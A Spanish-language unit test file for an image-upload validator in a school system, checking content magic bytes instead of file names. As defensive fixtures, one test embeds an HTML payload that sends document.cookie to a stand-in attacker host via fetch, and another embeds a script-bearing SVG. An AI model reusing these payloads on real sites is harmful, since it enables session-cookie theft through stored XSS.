import { revisarImagen, PESO_MAXIMO_IMAGEN } from '../../src/utils/archivos-que-se-aceptan';

/**
 * LO QUE SE SUBE, SE MIRA POR DENTRO
 *
 * El logo y el ícono del liceo se guardan en una carpeta que **se sirve
 * públicamente**. Antes se guardaban sin comprobar nada: la extensión salía del
 * nombre que mandaba quien subía el archivo, y el contenido se escribía tal cual.
 *
 * Con eso, quien pudiera cambiar el logo podía dejar colgada en el dominio del
 * sistema una página HTML cualquiera. Y una dirección del propio liceo sirviendo
 * la página de un atacante es justo lo que se usa para engañar: el dominio y el
 * candado son los de verdad, así que nadie sospecha.
 *
 * Estas pruebas son la garantía de que se mira el contenido y no el nombre.
 */

/** Una PNG de verdad: importan los primeros ocho bytes. */
const PNG_DE_VERDAD = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
]);

const JPG_DE_VERDAD = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
const GIF_DE_VERDAD = Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]);
const ICO_DE_VERDAD = Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01, 0x00]);

describe('Lo que se sube, se mira por dentro', () => {
    it('SUB-01: una imagen de verdad se acepta, y con la extensión que le toca', () => {
        expect(revisarImagen(PNG_DE_VERDAD, 'logo.png')).toMatchObject({
            aceptada: true,
            extension: '.png',
        });
        expect(revisarImagen(JPG_DE_VERDAD, 'foto.jpg').extension).toBe('.jpg');
        expect(revisarImagen(GIF_DE_VERDAD, 'anim.gif').extension).toBe('.gif');
        expect(revisarImagen(ICO_DE_VERDAD, 'icono.ico').extension).toBe('.ico');
    });

    it('SUB-02: una página HTML disfrazada de imagen NO entra', () => {
        // El ataque: el archivo se llama .png y el navegador dice que es una
        // imagen, pero por dentro es una página web. Si se guardara, quedaría
        // servida desde el dominio del liceo.
        const paginaDisfrazada = Buffer.from(
            '<html><script>fetch("https://el-atacante.com?c="+document.cookie)</script></html>',
            'utf8'
        );

        const veredicto = revisarImagen(paginaDisfrazada, 'logo-inocente.png');

        expect(veredicto.aceptada).toBe(false);
        expect(veredicto.motivo).toContain('no es una imagen válida');
    });

    it('SUB-03: un SVG con instrucciones dentro NO entra, aunque sea una imagen', () => {
        // El SVG es una imagen de verdad, pero por dentro es texto que el
        // navegador ejecuta. Se deja fuera a propósito.
        const svgConTruco = Buffer.from(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            'utf8'
        );

        expect(revisarImagen(svgConTruco, 'logo.svg').aceptada).toBe(false);
    });

    it('SUB-04: el nombre del archivo no decide nada; decide el contenido', () => {
        // Una PNG de verdad llamada ".html" se acepta COMO PNG.
        const comoHtml = revisarImagen(PNG_DE_VERDAD, 'trampa.html');
        expect(comoHtml.aceptada).toBe(true);
        expect(comoHtml.extension).toBe('.png');

        // Y un HTML llamado ".png" se rechaza, aunque el nombre diga otra cosa.
        const alReves = revisarImagen(Buffer.from('<html></html>', 'utf8'), 'parece.png');
        expect(alReves.aceptada).toBe(false);
    });

    it('SUB-05: un archivo vacío no pasa', () => {
        expect(revisarImagen(Buffer.alloc(0), 'vacio.png').aceptada).toBe(false);
    });

    it('SUB-06: un archivo enorme no pasa', () => {
        // Se parte de una PNG válida para que lo único que falle sea el tamaño.
        const gigante = Buffer.concat([PNG_DE_VERDAD, Buffer.alloc(PESO_MAXIMO_IMAGEN + 1)]);

        const veredicto = revisarImagen(gigante, 'enorme.png');

        expect(veredicto.aceptada).toBe(false);
        expect(veredicto.motivo).toContain('MB');
    });

    it('SUB-07: un ejecutable no pasa por mucho que se llame como imagen', () => {
        // MZ: como empiezan los ejecutables de Windows.
        const ejecutable = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
        expect(revisarImagen(ejecutable, 'logo.png').aceptada).toBe(false);
    });
});
